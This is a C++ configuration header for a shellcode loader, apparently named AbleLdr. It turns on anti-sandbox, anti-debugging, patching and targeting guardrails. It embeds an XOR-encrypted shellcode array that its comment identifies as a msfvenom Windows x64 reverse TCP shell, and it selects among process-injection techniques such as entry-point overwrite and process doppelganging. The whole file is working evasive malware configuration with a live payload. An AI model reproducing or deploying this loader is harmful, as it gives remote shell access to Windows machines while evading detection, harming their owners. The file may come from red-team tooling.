#ifndef ABLELDR_CONFIG_HPP
#define ABLELDR_CONFIG_HPP

// Guardrails
#define DOMAIN_CHECK 1
#define IP_CHECK 1
#define SANDBOX_CHECK 1

// Anti Sandbox
#define ANTI_SANDBOX_ENABLED 1
#define SLEEP_ENABLED 1

#define SLEEP_TIME 10000

#define SLEEP_METHOD 1
#if SLEEP_METHOD == 1
#define SleepMethod(sleep_time) malapi::SleepMs(sleep_time)
#endif

// Patching
#define PATCH_ENABLED 1

// Anti Debugging
#define ANTI_DEBUG_ENABLED 1

#define DEBUG_IS_BEING_DEBUGGED 1
#define DEBUG_REMOTE_DEBUGGING 1

// Encryption

//unsigned char key[] = { {{ENCRYPT_KEY}} };

unsigned char key[] = {
	0x41,0x41
}; // shellcrypt.py -i tcp_shellc.bin -e xor -k 4141 -f c

#define CONFIG_ENCRYPT_IV "AbleKey"

//#define CONFIG_ENCRYPTION_METHOD {{ }}

#define CONFIG_ENCRYPTION_METHOD 2
#if CONFIG_ENCRYPTION_METHOD == 1
#define DecryptShellcode(shellcode, shellcode_len, key, key_len) encrypt::NONE(shellcode, shellcode_len, key, key_len) // No Encryption
#elif CONFIG_ENCRYPTION_METHOD == 2
#define DecryptShellcode(shellcode, shellcode_len, key, key_len) encrypt::XOR(shellcode, shellcode_len, key, key_len) // XOR Encrypt
#elif CONFIG_ENCRYPTION_METHOD == 3
#define DecryptShellcode(shellcode, shellcode_len, key, key_len) encrypt::AES(shellcode, shellcode_len, key, key_len) // RC4 Encrypt
#elif CONFIG_ENCRYPTION_METHOD == 4
#define DecryptShellcode(shellcode, shellcode_len, key, key_len) encrypt::RC4(shellcode, shellcode_len, key, key_len) // AES Encrypt
#endif

// Obfuscation
#define CONFIG_OBFUSCATION_METHOD 1

// Payloads
//unsigned char shellcode[] = { {{SHELLCODE}} };
unsigned char shellcode[] = {
		0xbd,0x09,0xc2,0xa5,0xb1,0xa9,0x81,0x41,0x41,0x41,0x00,0x10,0x00,0x11,0x13,
		0x10,0x17,0x09,0x70,0x93,0x24,0x09,0xca,0x13,0x21,0x09,0xca,0x13,0x59,0x09,
		0xca,0x13,0x61,0x09,0xca,0x33,0x11,0x09,0x4e,0xf6,0x0b,0x0b,0x0c,0x70,0x88,
		0x09,0x70,0x81,0xed,0x7d,0x20,0x3d,0x43,0x6d,0x61,0x00,0x80,0x88,0x4c,0x00,
		0x40,0x80,0xa3,0xac,0x13,0x00,0x10,0x09,0xca,0x13,0x61,0xca,0x03,0x7d,0x09,
		0x40,0x91,0xca,0xc1,0xc9,0x41,0x41,0x41,0x09,0xc4,0x81,0x35,0x26,0x09,0x40,
		0x91,0x11,0xca,0x09,0x59,0x05,0xca,0x01,0x61,0x08,0x40,0x91,0xa2,0x17,0x09,
		0xbe,0x88,0x00,0xca,0x75,0xc9,0x09,0x40,0x97,0x0c,0x70,0x88,0x09,0x70,0x81,
		0xed,0x00,0x80,0x88,0x4c,0x00,0x40,0x80,0x79,0xa1,0x34,0xb0,0x0d,0x42,0x0d,
		0x65,0x49,0x04,0x78,0x90,0x34,0x99,0x19,0x05,0xca,0x01,0x65,0x08,0x40,0x91,
		0x27,0x00,0xca,0x4d,0x09,0x05,0xca,0x01,0x5d,0x08,0x40,0x91,0x00,0xca,0x45,
		0xc9,0x09,0x40,0x91,0x00,0x19,0x00,0x19,0x1f,0x18,0x1b,0x00,0x19,0x00,0x18,
		0x00,0x1b,0x09,0xc2,0xad,0x61,0x00,0x13,0xbe,0xa1,0x19,0x00,0x18,0x1b,0x09,
		0xca,0x53,0xa8,0x16,0xbe,0xbe,0xbe,0x1c,0x08,0xff,0x36,0x32,0x73,0x1e,0x72,
		0x73,0x41,0x41,0x00,0x17,0x08,0xc8,0xa7,0x09,0xc0,0xad,0xe1,0x40,0x41,0x41,
		0x08,0xc8,0xa4,0x08,0xfd,0x43,0x41,0x5e,0xd3,0xed,0x50,0x79,0x10,0x00,0x15,
		0x08,0xc8,0xa5,0x0d,0xc8,0xb0,0x00,0xfb,0x0d,0x36,0x67,0x46,0xbe,0x94,0x0d,
		0xc8,0xab,0x29,0x40,0x40,0x41,0x41,0x18,0x00,0xfb,0x68,0xc1,0x2a,0x41,0xbe,
		0x94,0x11,0x11,0x0c,0x70,0x88,0x0c,0x70,0x81,0x09,0xbe,0x81,0x09,0xc8,0x83,
		0x09,0xbe,0x81,0x09,0xc8,0x80,0x00,0xfb,0xab,0x4e,0x9e,0xa1,0xbe,0x94,0x09,
		0xc8,0x86,0x2b,0x51,0x00,0x19,0x0d,0xc8,0xa3,0x09,0xc8,0xb8,0x00,0xfb,0xd8,
		0xe4,0x35,0x20,0xbe,0x94,0x09,0xc0,0x85,0x01,0x43,0x41,0x41,0x08,0xf9,0x22,
		0x2c,0x25,0x41,0x41,0x41,0x41,0x41,0x00,0x11,0x00,0x11,0x09,0xc8,0xa3,0x16,
		0x16,0x16,0x0c,0x70,0x81,0x2b,0x4c,0x18,0x00,0x11,0xa3,0xbd,0x27,0x86,0x05,
		0x65,0x15,0x40,0x40,0x09,0xcc,0x05,0x65,0x59,0x87,0x41,0x29,0x09,0xc8,0xa7,
		0x17,0x11,0x00,0x11,0x00,0x11,0x00,0x11,0x08,0xbe,0x81,0x00,0x11,0x08,0xbe,
		0x89,0x0c,0xc8,0x80,0x0d,0xc8,0x80,0x00,0xfb,0x38,0x8d,0x7e,0xc7,0xbe,0x94,
		0x09,0x70,0x93,0x09,0xbe,0x8b,0xca,0x4f,0x00,0xfb,0x49,0xc6,0x5c,0x21,0xbe,
		0x94,0xfa,0xb1,0xf4,0xe3,0x17,0x00,0xfb,0xe7,0xd4,0xfc,0xdc,0xbe,0x94,0x09,
		0xc2,0x85,0x69,0x7d,0x47,0x3d,0x4b,0xc1,0xba,0xa1,0x34,0x44,0xfa,0x06,0x52,
		0x33,0x2e,0x2b,0x41,0x18,0x00,0xc8,0x9b,0xbe,0x94
}; // msfvenom -p windows/x64/shell_reverse_tcp lhost=eth0 lport=8082 -f raw -o tcp_shellc.bin

// Targets List

// Execution Methods
#define CONFIG_EXECUTION_METHOD 3
#define CONFIG_CREATE_PROCESS 3

#if CONFIG_EXECUTION_METHOD == 1
#define ExecuteShellcode(phandle, shellcode, shellcode_len) execute::CreateRemoteThreadInjection(phandle, shellcode, shellcode_len)
#elif CONFIG_EXECUTION_METHOD == 2
#define ExecuteShellcode(phandle, shellcode, shellcode_len) execute::RemoteHijack(phandle, shellcode, shellcode_len)
#elif CONFIG_EXECUTION_METHOD == 3
#define ExecuteShellcode(phandle, shellcode, shellcode_len) execute::AddressOfEntryPoint(phandle, shellcode, shellcode_len)
#elif CONFIG_EXECUTION_METHOD == 4
#define ExecuteShellcode(phandle, shellcode, shellcode_len) malapi::InjectionNtMapViewOfSection(phandle, shellcode, shellcode_len)
#elif CONFIG_EXECUTION_METHOD == 5
#define ExecuteShellcode(phandle, shellcode, shellcode_len) execute::Doppleganger(phandle, shellcode, shellcode_len)
#endif

#endif